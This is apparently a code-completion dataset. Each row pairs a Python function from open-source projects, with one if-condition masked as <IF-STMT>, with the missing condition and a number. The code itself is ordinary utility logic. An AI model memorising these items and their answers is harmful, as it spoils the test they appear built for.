2228,"def split_path_info(path):<tab># suitable for splitting an already-unquoted-already-decoded (unicode)<tab># path value<tab>path = path.strip(""/"")<tab>clean = []<tab>for segment in path.split(""/""):<tab><tab>if not segment or segment == ""."":<tab><tab><tab>continue<tab><tab>elif segment == "".."":<tab><tab><tab><IF-STMT><tab><tab><tab><tab>del clean[-1]<tab><tab>else:<tab><tab><tab>clean.append(segment)<tab>return tuple(clean)",if clean :,115
2229,"def _mock_manager(self, *args, **kwargs):<tab>if kwargs and ""normalize"" not in kwargs:<tab><tab>device_params = kwargs[""device_params""]<tab><tab>device_handler = make_device_handler(device_params)<tab><tab>session = SSHSession(device_handler)<tab><tab>return Manager(session, device_handler)<tab>if args:<tab><tab><IF-STMT><tab><tab><tab>file_name = (args[0].findtext(""command"")).replace("" "", ""_"")<tab><tab><tab>return self._read_file(file_name + "".xml"")<tab><tab>elif args[0].tag == ""command"":<tab><tab><tab>file_name = (args[0].text).replace("" "", ""_"")<tab><tab><tab>return self._read_file(file_name + "".xml"")","if args [ 0 ] . tag == ""request-pfe-execute"" :",193
2230,"def update_loan_status(self, cancel=0):<tab>if cancel:<tab><tab>loan_status = frappe.get_value(""Loan"", self.loan, ""status"")<tab><tab><IF-STMT><tab><tab><tab>frappe.db.set_value(""Loan"", self.loan, ""status"", ""Loan Closure Requested"")<tab>else:<tab><tab>pledged_qty = 0<tab><tab>current_pledges = get_pledged_security_qty(self.loan)<tab><tab>for security, qty in iteritems(current_pledges):<tab><tab><tab>pledged_qty += qty<tab><tab>if not pledged_qty:<tab><tab><tab>frappe.db.set_value(""Loan"", self.loan, ""status"", ""Closed"")","if loan_status == ""Closed"" :",198
2231,"def _wrapped_view(request, *args, **kwargs):<tab>if flag_name.startswith(""!""):<tab><tab>active = not flag_is_active(request, flag_name[1:])<tab>else:<tab><tab>active = flag_is_active(request, flag_name)<tab>if not active:<tab><tab>response_to_redirect_to = get_response_to_redirect(redirect_to, *args, **kwargs)<tab><tab><IF-STMT><tab><tab><tab>return response_to_redirect_to<tab><tab>else:<tab><tab><tab>raise Http404<tab>return view(request, *args, **kwargs)",if response_to_redirect_to :,149
2232,"def process_stroke_filter(stroke, min_distance=1.0, max_distance=2.0):<tab>""""""filter stroke to pts that are at least min_distance apart""""""<tab>nstroke = stroke[:1]<tab>for p in stroke[1:]:<tab><tab>v = p - nstroke[-1]<tab><tab>l = v.length<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>d = v / l<tab><tab>while l > 0:<tab><tab><tab>q = nstroke[-1] + d * min(l, max_distance)<tab><tab><tab>nstroke.append(q)<tab><tab><tab>l -= max_distance<tab>return nstroke",if l < min_distance :,158
2233,"def _fix_break_node(self, node: Node):<tab>end_node = self._find_end_loop(node, [], 0)<tab><IF-STMT><tab><tab># If there is not end condition on the loop<tab><tab># The exploration will reach a STARTLOOP before reaching the endloop<tab><tab># We start with -1 as counter to catch this corner case<tab><tab>end_node = self._find_end_loop(node, [], -1)<tab><tab>if not end_node:<tab><tab><tab>raise ParsingError(""Break in no-loop context {}"".format(node.function))<tab>for son in node.sons:<tab><tab>son.remove_father(node)<tab>node.set_sons([end_node])<tab>end_node.add_father(node)",if not end_node :,187
2234,"def _Append(cls, session, word, mail_ids, compact=True):<tab>super(GlobalPostingList, cls)._Append(session, word, mail_ids, compact=compact)<tab>with GLOBAL_GPL_LOCK:<tab><tab>global GLOBAL_GPL<tab><tab>sig = cls.WordSig(word, session.config)<tab><tab><IF-STMT><tab><tab><tab>GLOBAL_GPL = {}<tab><tab>if sig not in GLOBAL_GPL:<tab><tab><tab>GLOBAL_GPL[sig] = set()<tab><tab>for mail_id in mail_ids:<tab><tab><tab>GLOBAL_GPL[sig].add(mail_id)",if GLOBAL_GPL is None :,154
2235,"def __saveComment(self):<tab>""""""Saves the new or selected comment""""""<tab>if self.__btnSave.text() == SAVE_NEW:<tab><tab># If saving a new comment<tab><tab>self.__addComment(self.__textSubject.text(), self.__textMessage.toPlainText())<tab><tab>self.refreshComments()<tab>else:<tab><tab># If saving a modified comment<tab><tab><IF-STMT><tab><tab><tab>comment = self.__treeSubjects.currentItem().getInstance()<tab><tab><tab>comment.setSubject(str(self.__textSubject.text()))<tab><tab><tab>comment.setMessage(str(self.__textMessage.toPlainText()))<tab><tab><tab>self.__treeSubjects.currentItem().getInstance().save()<tab><tab><tab>self.refreshComments()",if self . __treeSubjects . currentItem ( ) :,183
2236,"def verify_random_objects():<tab>resources = [Node, Registration, QuickFilesNode]<tab>for resource in resources:<tab><tab>for i in range(1, 10):<tab><tab><tab>random_resource = _get_random_object(resource)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>_verify_contributor_perms(random_resource)",if random_resource :,85
2237,"def apply_gradient_modifiers(self):<tab>for layer_name, views in self.gradient_modifiers.items():<tab><tab>for view_name, gradient_mods in views.items():<tab><tab><tab>for gm in gradient_mods:<tab><tab><tab><tab>gm.rnd.set_seed(self.rnd.generate_seed())<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>gm(<tab><tab><tab><tab><tab><tab>self.handler,<tab><tab><tab><tab><tab><tab>self.buffer[layer_name].parameters[view_name],<tab><tab><tab><tab><tab><tab>self.buffer[layer_name].gradients[view_name],<tab><tab><tab><tab><tab>)<tab><tab><tab><tab>else:<tab><tab><tab><tab><tab>gm(self.handler, self.buffer[layer_name].gradients[view_name])","if isinstance ( gm , GradientModifier ) :",195
2238,"def _split_auth_string(auth_string):<tab>""""""split a digest auth string into individual key=value strings""""""<tab>prev = None<tab>for item in auth_string.split("",""):<tab><tab>try:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>prev = ""%s,%s"" % (prev, item)<tab><tab><tab><tab>continue<tab><tab>except AttributeError:<tab><tab><tab>if prev == None:<tab><tab><tab><tab>prev = item<tab><tab><tab><tab>continue<tab><tab><tab>else:<tab><tab><tab><tab>raise StopIteration<tab><tab>yield prev.strip()<tab><tab>prev = item<tab>yield prev.strip()<tab>raise StopIteration","if prev . count ( '""' ) == 1 :",152
2239,"def checkUnchangedIvars(obj, d, exceptions=None):<tab>if not exceptions:<tab><tab>exceptions = []<tab>ok = True<tab>for key in d:<tab><tab><IF-STMT><tab><tab><tab>if getattr(obj, key) != d.get(key):<tab><tab><tab><tab>g.trace(<tab><tab><tab><tab><tab>""changed ivar: %s old: %s new: %s""<tab><tab><tab><tab><tab>% (key, repr(d.get(key)), repr(getattr(obj, key)))<tab><tab><tab><tab>)<tab><tab><tab><tab>ok = False<tab>return ok",if key not in exceptions :,142
2240,def checkChildren(item):<tab>for c in item.children():<tab><tab>_id = c.data(Outline.ID.value)<tab><tab><IF-STMT><tab><tab><tab>c.getUniqueID()<tab><tab>checkChildren(c),"if not _id or _id == ""0"" :",65
2241,"def main():<tab>if len(sys.argv) > 1:<tab><tab>g = globals().copy()<tab><tab>r = g[""test_"" + sys.argv[1]]()<tab><tab><IF-STMT><tab><tab><tab>for func_and_args in r:<tab><tab><tab><tab>func, args = func_and_args[0], func_and_args[1:]<tab><tab><tab><tab>func(*args)<tab>else:<tab><tab>run_all()",if r is not None :,109
2242,"def _create_entities(<tab>parsed_entities: Dict[Text, Union[Text, List[Text]]], sidx: int, eidx: int) -> List[Dict[Text, Any]]:<tab>entities = []<tab>for k, vs in parsed_entities.items():<tab><tab><IF-STMT><tab><tab><tab>vs = [vs]<tab><tab>for value in vs:<tab><tab><tab>entities.append(<tab><tab><tab><tab>{<tab><tab><tab><tab><tab>""entity"": k,<tab><tab><tab><tab><tab>""start"": sidx,<tab><tab><tab><tab><tab>""end"": eidx,  # can't be more specific<tab><tab><tab><tab><tab>""value"": value,<tab><tab><tab><tab>}<tab><tab><tab>)<tab>return entities","if not isinstance ( vs , list ) :",172
2243,"def _group_stacks(stacks: Stacks) -> List[dict]:<tab>stacks_by_client: dict = {}<tab>for stack in stacks:<tab><tab>client = stack.client<tab><tab><IF-STMT><tab><tab><tab>stacks_by_client[client] = {""Client"": client, ""Stacks"": []}<tab><tab>stacks_by_client[client][""Stacks""].append(stack)<tab>return [stacks_by_client[r] for r in stacks_by_client]",if client not in stacks_by_client :,116
2244,"def append(self, labels):<tab>if isinstance(labels, list):<tab><tab>for label in labels:<tab><tab><tab>if not label in self.__menuLabels:<tab><tab><tab><tab>self.__menuLabels.append(label)<tab><tab><tab><tab>self.__enabledLabels.append(label)<tab>else:<tab><tab><IF-STMT><tab><tab><tab>self.__menuLabels.append(labels)<tab><tab><tab>self.__enabledLabels.append(labels)",if not labels in self . __menuLabels :,108
2245,"def _json_to_flat_metrics(self, prefix, data):<tab>for key, value in data.items():<tab><tab><IF-STMT><tab><tab><tab>for k, v in self._json_to_flat_metrics(""%s.%s"" % (prefix, key), value):<tab><tab><tab><tab>yield k, v<tab><tab>else:<tab><tab><tab>try:<tab><tab><tab><tab>int(value)<tab><tab><tab>except ValueError:<tab><tab><tab><tab>value = None<tab><tab><tab>finally:<tab><tab><tab><tab>yield (""%s.%s"" % (prefix, key), value)","if isinstance ( value , dict ) :",138
2246,"def _rename(src, dst):<tab>src = to_unicode(src, sys.getfilesystemencoding())<tab>dst = to_unicode(dst, sys.getfilesystemencoding())<tab>if _rename_atomic(src, dst):<tab><tab>return True<tab>retry = 0<tab>rv = False<tab>while not rv and retry < 100:<tab><tab>rv = _MoveFileEx(src, dst, _MOVEFILE_REPLACE_EXISTING | _MOVEFILE_WRITE_THROUGH)<tab><tab><IF-STMT><tab><tab><tab>time.sleep(0.001)<tab><tab><tab>retry += 1<tab>return rv",if not rv :,135
2247,"def expect_stream_start(self):<tab>if isinstance(self.event, StreamStartEvent):<tab><tab><IF-STMT><tab><tab><tab>self.encoding = self.event.encoding<tab><tab>self.write_stream_start()<tab><tab>self.state = self.expect_first_document_start<tab>else:<tab><tab>raise EmitterError(""expected StreamStartEvent, but got %s"" % self.event)","if self . event . encoding and not getattr ( self . stream , ""encoding"" , None ) :",111
2248,"def _doWait(self):<tab>doit = True<tab>while doit:<tab><tab># A wrapper method for wait() and the wait thread to use<tab><tab>self.setMeta(""SignalInfo"", None)<tab><tab>self.setMeta(""PendingSignal"", None)<tab><tab>event = self.platformWait()<tab><tab>self.running = False<tab><tab>self.platformProcessEvent(event)<tab><tab>doit = self.shouldRunAgain()<tab><tab><IF-STMT><tab><tab><tab>self._doRun()",if doit :,121
2249,"def get_source(self, environment, template):<tab>if self._sep in template:<tab><tab>prefix, name = template.split(self._sep, 1)<tab><tab><IF-STMT><tab><tab><tab>raise TemplateNotFound(template)<tab><tab>return self._mapping[prefix].get_source(environment, name)<tab>return self._default.get_source(environment, template)",if prefix not in self . _mapping :,92
2250,"def find_child_processes_that_send_spans(pants_result_stderr):<tab>child_processes = set()<tab>for line in pants_result_stderr.split(""\n""):<tab><tab><IF-STMT><tab><tab><tab>i = line.rindex("":"")<tab><tab><tab>child_process_pid = line[i + 1 :]<tab><tab><tab>child_processes.add(int(child_process_pid))<tab>return child_processes","if ""Sending spans to Zipkin server from pid:"" in line :",113
2251,"def list_dependencies_modules(self, *modules):<tab>""""""[UNIT]... show the dependency tree"" """"""<tab>found_all = True<tab>units = []<tab>for module in modules:<tab><tab>matched = self.match_units([module])<tab><tab>if not matched:<tab><tab><tab>logg.error(""no such service '%s'"", module)<tab><tab><tab>found_all = False<tab><tab><tab>continue<tab><tab>for unit in matched:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>units += [unit]<tab>return self.list_dependencies_units(units)  # and found_all",if unit not in units :,143
2252,"def getCommitFromFile(short=True):<tab>global _gitdir<tab>branch = getBranchFromFile()<tab>commit = None<tab>if _gitdir and branch:<tab><tab><IF-STMT><tab><tab><tab>commitFile = os.path.join(_gitdir, ""HEAD"")<tab><tab>else:<tab><tab><tab>commitFile = os.path.join(_gitdir, ""refs"", ""heads"", branch)<tab><tab>if os.path.isfile(commitFile):<tab><tab><tab>with open(commitFile, ""r"", encoding=""utf-8"") as f:<tab><tab><tab><tab>commit = f.readline().strip()<tab>if short and commit:<tab><tab>return commit[:8]<tab>else:<tab><tab>return commit","if branch == ""HEAD"" :",169
2253,"def _node_for(pvector_like, i):<tab>if 0 <= i < pvector_like._count:<tab><tab><IF-STMT><tab><tab><tab>return pvector_like._tail<tab><tab>node = pvector_like._root<tab><tab>for level in range(pvector_like._shift, 0, -SHIFT):<tab><tab><tab>node = node[(i >> level) & BIT_MASK]  # >>><tab><tab>return node<tab>raise IndexError(""Index out of range: %s"" % (i,))",if i >= pvector_like . _tail_offset :,128
2254,"def check(self):<tab>global MySQLdb<tab>import MySQLdb<tab>try:<tab><tab>args = {}<tab><tab>if mysql_user:<tab><tab><tab>args[""user""] = mysql_user<tab><tab>if mysql_pwd:<tab><tab><tab>args[""passwd""] = mysql_pwd<tab><tab><IF-STMT><tab><tab><tab>args[""host""] = mysql_host<tab><tab>if mysql_port:<tab><tab><tab>args[""port""] = mysql_port<tab><tab>if mysql_socket:<tab><tab><tab>args[""unix_socket""] = mysql_socket<tab><tab>self.db = MySQLdb.connect(**args)<tab>except Exception as e:<tab><tab>raise Exception(""Cannot interface with MySQL server: %s"" % e)",if mysql_host :,167
2255,"def flatten(self, d, parent_key="""", sep="".""):<tab>items = []<tab>for k, v in d.items():<tab><tab>new_key = parent_key + sep + k if parent_key else k<tab><tab><IF-STMT><tab><tab><tab>items.extend(self.flatten(v, new_key, sep=sep).items())<tab><tab>else:<tab><tab><tab>items.append((new_key, v))<tab>return dict(items)","if isinstance ( v , MutableMapping ) :",111
2256,"def get_item(type_, preference):<tab>items = {}<tab>for item in playlist.findall(""./info/%s/item"" % type_):<tab><tab>lang, label = xpath_text(item, ""lg"", default=None), xpath_text(<tab><tab><tab>item, ""label"", default=None<tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>items[lang] = label.strip()<tab>for p in preference:<tab><tab>if items.get(p):<tab><tab><tab>return items[p]",if lang and label :,121
2257,"def test_lxml():<tab>try:<tab><tab>from lxml.etree import LXML_VERSION, __version__<tab><tab><IF-STMT><tab><tab><tab>return True, __version__<tab><tab>else:<tab><tab><tab>return False, __version__<tab>except ImportError:<tab><tab>return None, None","if LXML_VERSION >= ( 2 , 1 , 4 , 0 ) :",81
2258,"def send(self, data, flags=0, timeout=timeout_default):<tab>if timeout is timeout_default:<tab><tab>timeout = self.timeout<tab>try:<tab><tab>return self._sock.send(data, flags)<tab>except error as ex:<tab><tab><IF-STMT><tab><tab><tab>raise<tab><tab>sys.exc_clear()<tab><tab>self._wait(self._write_event)<tab><tab>try:<tab><tab><tab>return self._sock.send(data, flags)<tab><tab>except error as ex2:<tab><tab><tab>if ex2.args[0] == EWOULDBLOCK:<tab><tab><tab><tab>return 0<tab><tab><tab>raise",if ex . args [ 0 ] not in _socketcommon . GSENDAGAIN or timeout == 0.0 :,175
2259,def blob_from_lang(self):<tab>self.acquire_lock()<tab>try:<tab><tab><IF-STMT><tab><tab><tab>try:<tab><tab><tab><tab>self._load_buf_data_once()<tab><tab><tab>except NotFoundInDatabase:<tab><tab><tab><tab>self.release_lock()<tab><tab><tab><tab>try:<tab><tab><tab><tab><tab>self.scan()<tab><tab><tab><tab>finally:<tab><tab><tab><tab><tab>self.acquire_lock()<tab><tab><tab><tab>self._load_buf_data_once(True)<tab><tab>return self._blob_from_lang_cache<tab>finally:<tab><tab>self.release_lock(),if self . _blob_from_lang_cache is None :,159
2260,"def processElem(elem, keyList):<tab>for k, v in elem.items():<tab><tab>prefix = ""."".join(keyList)<tab><tab><IF-STMT><tab><tab><tab>k = makeSane(k)<tab><tab><tab>self.publish(""%s.%s"" % (prefix, k), v)",if k not in self . IGNORE_ELEMENTS and self . NUMVAL_MATCH . match ( v ) :,90
2261,"def __conform__(self, interface, registry=None, default=None):<tab>for providedInterface in self.provided:<tab><tab>if providedInterface.isOrExtends(interface):<tab><tab><tab>return self.load()<tab><tab><IF-STMT><tab><tab><tab>return interface(self.load(), default)<tab>return default","if getAdapterFactory ( providedInterface , interface , None ) is not None :",87
2262,"def restrict(points):<tab>result = []<tab>for p in points:<tab><tab><IF-STMT><tab><tab><tab>result.append(p)<tab><tab>else:<tab><tab><tab>loc, normal, index, distance = bvh.find_nearest(p)<tab><tab><tab>if loc is not None:<tab><tab><tab><tab>result.append(tuple(loc))<tab>return result","if point_inside_mesh ( bvh , p ) :",96
2263,"def __iter__(self):<tab>buffer = [b""""]<tab>for chunk in self.stream(decode_content=True):<tab><tab>if b""\n"" in chunk:<tab><tab><tab>chunk = chunk.split(b""\n"")<tab><tab><tab>yield b"""".join(buffer) + chunk[0] + b""\n""<tab><tab><tab>for x in chunk[1:-1]:<tab><tab><tab><tab>yield x + b""\n""<tab><tab><tab><IF-STMT><tab><tab><tab><tab>buffer = [chunk[-1]]<tab><tab><tab>else:<tab><tab><tab><tab>buffer = []<tab><tab>else:<tab><tab><tab>buffer.append(chunk)<tab>if buffer:<tab><tab>yield b"""".join(buffer)",if chunk [ - 1 ] :,165
2264,"def clear_doc(self, docname: str) -> None:<tab>for sChild in self._children:<tab><tab>sChild.clear_doc(docname)<tab><tab>if sChild.declaration and sChild.docname == docname:<tab><tab><tab>sChild.declaration = None<tab><tab><tab>sChild.docname = None<tab><tab><tab>sChild.line = None<tab><tab><tab>if sChild.siblingAbove is not None:<tab><tab><tab><tab>sChild.siblingAbove.siblingBelow = sChild.siblingBelow<tab><tab><tab><IF-STMT><tab><tab><tab><tab>sChild.siblingBelow.siblingAbove = sChild.siblingAbove<tab><tab><tab>sChild.siblingAbove = None<tab><tab><tab>sChild.siblingBelow = None",if sChild . siblingBelow is not None :,189
2265,"def _get_current_weight(self, policy, fw):<tab>weights = policy.get_weights()<tab>if fw == ""torch"":<tab><tab># DQN model.<tab><tab><IF-STMT><tab><tab><tab>return weights[""_hidden_layers.0._model.0.weight""][0][0]<tab><tab># DDPG model.<tab><tab>else:<tab><tab><tab>return weights[""policy_model.action_0._model.0.weight""][0][0]<tab>key = 0 if fw in [""tf2"", ""tfe""] else list(weights.keys())[0]<tab>return weights[key][0][0]","if ""_hidden_layers.0._model.0.weight"" in weights :",163
2266,"def add_unit(self, name, value, aliases=tuple(), **modifiers):<tab>""""""Add unit to the registry.""""""<tab>if not isinstance(value, self.Quantity):<tab><tab>value = self.Quantity(value, **modifiers)<tab>self._UNITS[name] = value<tab>for ndx, alias in enumerate(aliases):<tab><tab><IF-STMT><tab><tab><tab>logger.warn(""Alias cannot contain a space "" + alias)<tab><tab>self._UNITS.add_alias(alias.strip(), name, not ndx)","if "" "" in alias :",127
2267,"def keyPressEvent(self, event):<tab>""""""Add up and down arrow key events to built in functionality.""""""<tab>keyPressed = event.key()<tab>if keyPressed in [Constants.UP_KEY, Constants.DOWN_KEY, Constants.TAB_KEY]:<tab><tab>if keyPressed == Constants.UP_KEY:<tab><tab><tab>self.index = max(0, self.index - 1)<tab><tab>elif keyPressed == Constants.DOWN_KEY:<tab><tab><tab>self.index = min(len(self.completerStrings) - 1, self.index + 1)<tab><tab><IF-STMT><tab><tab><tab>self.tabPressed()<tab><tab>if self.completerStrings:<tab><tab><tab>self.setTextToCompleterIndex()<tab>super(CueLineEdit, self).keyPressEvent(event)",elif keyPressed == Constants . TAB_KEY and self . completerStrings :,192
2268,"def _add_bookmark_breakpoint(self):<tab>""""""Add a bookmark or breakpoint to the current file in the editor.""""""<tab>editorWidget = self.ide.mainContainer.get_actual_editor()<tab>if editorWidget and editorWidget.hasFocus():<tab><tab><IF-STMT><tab><tab><tab>editorWidget._sidebarWidget.set_bookmark(<tab><tab><tab><tab>editorWidget.textCursor().blockNumber()<tab><tab><tab>)<tab><tab>elif self.ide.mainContainer.actualTab.navigator.operation == 2:<tab><tab><tab>editorWidget._sidebarWidget.set_breakpoint(<tab><tab><tab><tab>editorWidget.textCursor().blockNumber()<tab><tab><tab>)",if self . ide . mainContainer . actualTab . navigator . operation == 1 :,175
2269,"def list_generator(pages, num_results):<tab>result = []<tab># get first page items<tab>page = list(next(pages))<tab>result += page<tab>while True:<tab><tab>if not pages.continuation_token:<tab><tab><tab>break<tab><tab># handle num results<tab><tab>if num_results is not None:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>break<tab><tab>page = list(next(pages))<tab><tab>result += page<tab>return result",if num_results == len ( result ) :,118
2270,"def _print_handles(self, text, handle_list):<tab>for handle in handle_list:<tab><tab>source, citation = self.get_source_or_citation(handle, False)<tab><tab>_LOG.debug(""\n\n\n"")<tab><tab>if source:<tab><tab><tab>_LOG.debug(""---- %s -- source %s"" % (text, source.get_title()))<tab><tab><IF-STMT><tab><tab><tab>_LOG.debug(""---- %s -- citation %s"" % (text, citation.get_page()))<tab><tab>else:<tab><tab><tab>_LOG.debug(""---- %s -- handle %s"" % (text, handle))",elif citation :,161
2271,"def _parse_whois(self, txt):<tab>asn, desc = None, b""""<tab>for l in txt.splitlines():<tab><tab>if not asn and l.startswith(b""origin:""):<tab><tab><tab>asn = l[7:].strip().decode(""utf-8"")<tab><tab>if l.startswith(b""descr:""):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>desc += br""\n""<tab><tab><tab>desc += l[6:].strip()<tab><tab>if asn is not None and desc.strip():<tab><tab><tab>desc = desc.strip().decode(""utf-8"")<tab><tab><tab>break<tab>return asn, desc",if desc :,151
2272,"def build(opt):<tab>dpath = os.path.join(opt[""datapath""], ""multiwoz_v20"")<tab>version = ""1.0""<tab>if not build_data.built(dpath, version_string=version):<tab><tab>print(""[building data: "" + dpath + ""]"")<tab><tab><IF-STMT><tab><tab><tab>build_data.remove_dir(dpath)<tab><tab>build_data.make_dir(dpath)<tab><tab># Download the data.<tab><tab>for downloadable_file in RESOURCES:<tab><tab><tab>downloadable_file.download_file(dpath)<tab><tab>build_data.mark_done(dpath, version_string=version)",if build_data . built ( dpath ) :,163
2273,"def _global_pool2d_shape_func(data_shape, height_axis, width_axis):<tab>out = output_tensor((data_shape.shape[0],), ""int64"")<tab>for i in const_range(out.shape[0]):<tab><tab><IF-STMT><tab><tab><tab>out[i] = int64(1)<tab><tab>else:<tab><tab><tab>out[i] = data_shape[i]<tab>return out",if i == height_axis or i == width_axis :,114
2274,"def post_mortem(t=None):<tab># handling the default<tab><IF-STMT><tab><tab># sys.exc_info() returns (type, value, traceback) if an exception is<tab><tab># being handled, otherwise it returns None<tab><tab>t = sys.exc_info()[2]<tab><tab>if t is None:<tab><tab><tab>raise ValueError(<tab><tab><tab><tab>""A valid traceback must be passed if no "" ""exception is being handled""<tab><tab><tab>)<tab>p = Pdb()<tab>p.reset()<tab>p.interaction(None, t)",if t is None :,134
2275,"def clear(self, purge=False, delete_dataset=True):<tab>self.deleted = True<tab>if self.dataset:<tab><tab><IF-STMT><tab><tab><tab>self.dataset.deleted = True<tab><tab>if purge:<tab><tab><tab>self.dataset.purged = True<tab>if purge and self.dataset.deleted:  # do something with purging<tab><tab>self.purged = True<tab><tab>try:<tab><tab><tab>os.unlink(self.file_name)<tab><tab>except Exception as e:<tab><tab><tab>log.error(<tab><tab><tab><tab>""Failed to purge associated file ({}) from disk: {}"".format(<tab><tab><tab><tab><tab>self.file_name, unicodify(e)<tab><tab><tab><tab>)<tab><tab><tab>)",if delete_dataset :,175
2276,"def scan_resource_conf(self, conf):<tab>if ""properties"" in conf:<tab><tab><IF-STMT><tab><tab><tab>if str(conf[""properties""][""supportsHttpsTrafficOnly""]).lower() == ""true"":<tab><tab><tab><tab>return CheckResult.PASSED<tab><tab><tab>else:<tab><tab><tab><tab>return CheckResult.FAILED<tab># Use default if supportsHttpsTrafficOnly is not set<tab>if ""apiVersion"" in conf:<tab><tab># Default for apiVersion 2019 and newer is supportsHttpsTrafficOnly = True<tab><tab>year = int(conf[""apiVersion""][0:4])<tab><tab>if year < 2019:<tab><tab><tab>return CheckResult.FAILED<tab><tab>else:<tab><tab><tab>return CheckResult.PASSED<tab>return CheckResult.FAILED","if ""supportsHttpsTrafficOnly"" in conf [ ""properties"" ] :",192
2277,"def connect(self):<tab>while True:<tab><tab>errno = self.sock.connect_ex(self.addr)<tab><tab>if not errno:<tab><tab><tab># connected immediately.<tab><tab><tab>break<tab><tab>elif errno == EINPROGRESS:<tab><tab><tab># will be connected.<tab><tab><tab>break<tab><tab><IF-STMT><tab><tab><tab># no such socket file.<tab><tab><tab>self.create_connection(self.failover_interval)<tab><tab><tab>return<tab><tab>else:<tab><tab><tab>raise ValueError(""Unexpected socket errno: %d"" % errno)<tab>self.event_loop.watch_file(self.sock.fileno(), self.handle)",elif errno == ENOENT :,157
2278,"def _get_commands():<tab>proc = Popen([""react-native"", ""--help""], stdout=PIPE)<tab>should_yield = False<tab>for line in proc.stdout.readlines():<tab><tab>line = line.decode().strip()<tab><tab>if not line:<tab><tab><tab>continue<tab><tab>if ""Commands:"" in line:<tab><tab><tab>should_yield = True<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>yield line.split("" "")[0]",if should_yield :,111
2279,"def getintdict(self, section):<tab>try:<tab><tab># Exclude keys from [DEFAULT] section because in general they do not hold int values<tab><tab>return dict(<tab><tab><tab>(key, int(value))<tab><tab><tab>for key, value in self.items(section)<tab><tab><tab><IF-STMT><tab><tab>)<tab>except NoSectionError:<tab><tab>return {}","if key not in { k for k , _ in self . items ( ""DEFAULT"" ) }",103
2280,"def _gen_opnds(ii):  # generator<tab># filter out write-mask operands and suppressed operands<tab>for op in ii.parsed_operands:<tab><tab>if op.lookupfn_name in [""MASK1"", ""MASKNOT0""]:<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>if op.name == ""BCAST"":<tab><tab><tab>continue<tab><tab>yield op","if op . visibility == ""SUPPRESSED"" :",104
2281,"def do_definition(tag):<tab>w.end_para()<tab>macro("".TP"")<tab>w.started = True<tab>split = 0<tab>pre = []<tab>post = []<tab>for typ, text in _bitlist(tag):<tab><tab>if split:<tab><tab><tab>post.append((typ, text))<tab><tab><IF-STMT><tab><tab><tab>split = 1<tab><tab><tab>post.append((typ, text.lstrip()[2:].lstrip()))<tab><tab>else:<tab><tab><tab>pre.append((typ, text))<tab>_boldline(pre)<tab>w.write(_text(post))<tab>w.started = False","elif text . lstrip ( ) . startswith ( "": "" ) :",153
2282,"def EvalInScriptedSection(self, codeBlock, globals, locals=None):<tab>if locals is None:<tab><tab>locals = globals<tab>assert not codeBlock.beenExecuted, ""This code block should not have been executed""<tab>codeBlock.beenExecuted = 1<tab>self.BeginScriptedSection()<tab>try:<tab><tab>try:<tab><tab><tab>return self._EvalInScriptedSection(codeBlock.codeObject, globals, locals)<tab><tab>finally:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self.debugManager.OnLeaveScript()<tab><tab><tab>self.EndScriptedSection()<tab>except:<tab><tab>self.HandleException(codeBlock)",if self . debugManager :,162
2283,"def OSError__str__(self):<tab>if self.filename:<tab><tab><IF-STMT><tab><tab><tab>return ""[Errno %s] %s: %s -> %s"" % (<tab><tab><tab><tab>self.errno,<tab><tab><tab><tab>self.strerror,<tab><tab><tab><tab>self.filename,<tab><tab><tab><tab>self.filename2,<tab><tab><tab>)<tab><tab>else:<tab><tab><tab>return ""[Errno %s] %s: %s"" % (self.errno, self.strerror, self.filename)<tab>if self.errno and self.strerror:<tab><tab>return ""[Errno %s] %s"" % (self.errno, self.strerror)<tab>return BaseException.__str__(self)",if self . filename2 :,164
2284,"def save(self, *args, **kwargs):<tab>if not self.identifier:<tab><tab>charset = list(""ABCDEFGHJKLMNPQRSTUVWXYZ3789"")<tab><tab>while True:<tab><tab><tab>code = get_random_string(length=8, allowed_chars=charset)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self.identifier = code<tab><tab><tab><tab>break<tab>super().save(*args, **kwargs)<tab>if self.event:<tab><tab>self.event.cache.clear()","if not Question . objects . filter ( event = self . event , identifier = code ) . exists ( ) :",138
2285,"def malloc(self, size):<tab># return a block of right size (possibly rounded up)<tab>assert 0 <= size < sys.maxint<tab>if os.getpid() != self._lastpid:<tab><tab>self.__init__()  # reinitialize after fork<tab>self._lock.acquire()<tab>try:<tab><tab>size = self._roundup(max(size, 1), self._alignment)<tab><tab>(arena, start, stop) = self._malloc(size)<tab><tab>new_stop = start + size<tab><tab><IF-STMT><tab><tab><tab>self._free((arena, new_stop, stop))<tab><tab>block = (arena, start, new_stop)<tab><tab>self._allocated_blocks.add(block)<tab><tab>return block<tab>finally:<tab><tab>self._lock.release()",if new_stop < stop :,196
2286,"def commit(cache):<tab>assert cache.is_alive<tab>try:<tab><tab>if cache.modified:<tab><tab><tab>cache.flush()<tab><tab><IF-STMT><tab><tab><tab>assert cache.connection is not None<tab><tab><tab>cache.database.provider.commit(cache.connection, cache)<tab><tab>cache.for_update.clear()<tab><tab>cache.query_results.clear()<tab><tab>cache.max_id_cache.clear()<tab><tab>cache.immediate = True<tab>except:<tab><tab>cache.rollback()<tab><tab>raise",if cache . in_transaction :,131
2287,"def __get_tasks(cls, task_ids=None, project_name=None, task_name=None, **kwargs):<tab>if task_ids:<tab><tab><IF-STMT><tab><tab><tab>task_ids = [task_ids]<tab><tab>return [<tab><tab><tab>cls(private=cls.__create_protection, task_id=task_id, log_to_backend=False)<tab><tab><tab>for task_id in task_ids<tab><tab>]<tab>return [<tab><tab>cls(private=cls.__create_protection, task_id=task.id, log_to_backend=False)<tab><tab>for task in cls._query_tasks(<tab><tab><tab>project_name=project_name, task_name=task_name, **kwargs<tab><tab>)<tab>]","if isinstance ( task_ids , six . string_types ) :",191
